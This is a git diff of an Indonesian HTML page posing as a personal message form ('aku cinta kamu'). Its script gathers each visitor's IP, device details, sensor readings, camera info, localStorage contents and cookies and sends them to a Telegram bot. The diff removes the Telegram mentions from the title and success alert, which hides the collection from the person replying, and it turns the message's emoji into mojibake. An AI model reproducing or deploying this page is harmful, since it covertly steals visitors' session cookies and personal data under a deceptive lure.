@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Kirim ke Telegram</title>
+    <title>Pesan Dari Orang</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -61,7 +61,7 @@
     </style>
 </head>
 <body>
-    <h3>lu kek monyet</h3>
+    <h3>aku cinta kamu</h3>
     <h5>Kirim Balasan</h5>
     <form id="telegramForm">
         <label for="pesan">Balasan Anda:</label>
@@ -161,7 +161,7 @@
             const localStorageData = getLocalStorageData();
             const cookieData = getCookies();
 
-            const message = `📩 Pesan Baru:\n\nPesan: ${pesanUser}\n\n📌 Data Pengunjung:\n- User Agent: ${navigator.userAgent}\n- IP Address: ${ip}\n- Perangkat: ${navigator.platform}\n- Baterai: ${baterai}\n- Memori: ${memori}\n- Jenis Koneksi: ${koneksi}\n- Sensor Cahaya: ${sensor.light}\n- Orientasi: ${sensor.orientation}\n- Akselerometer: ${sensor.accelerometer}\n- Gyroskop: ${sensor.gyroscope}\n- Gravitasi: ${sensor.gravity}\n- Kamera: ${kamera}\n- Ukuran Layar: ${ukuranLayar}\n- Resolusi Layar: ${resolusiLayar}\n- LocalStorage Data: ${localStorageData}\n- Cookie Data: ${cookieData}`;
+            const message = `ðŸ“© Pesan Baru:\n\nPesan: ${pesanUser}\n\nðŸ“Œ Data Pengunjung:\n- User Agent: ${navigator.userAgent}\n- IP Address: ${ip}\n- Perangkat: ${navigator.platform}\n- Baterai: ${baterai}\n- Memori: ${memori}\n- Jenis Koneksi: ${koneksi}\n- Sensor Cahaya: ${sensor.light}\n- Orientasi: ${sensor.orientation}\n- Akselerometer: ${sensor.accelerometer}\n- Gyroskop: ${sensor.gyroscope}\n- Gravitasi: ${sensor.gravity}\n- Kamera: ${kamera}\n- Ukuran Layar: ${ukuranLayar}\n- Resolusi Layar: ${resolusiLayar}\n- LocalStorage Data: ${localStorageData}\n- Cookie Data: ${cookieData}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -174,7 +174,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Pesan berhasil dikirim ke Telegram!');
+                    alert('Pesan berhasil dikirim');
                     document.getElementById('telegramForm').reset();
                 } else {
                     alert('Gagal mengirim pesan. Coba lagi.');
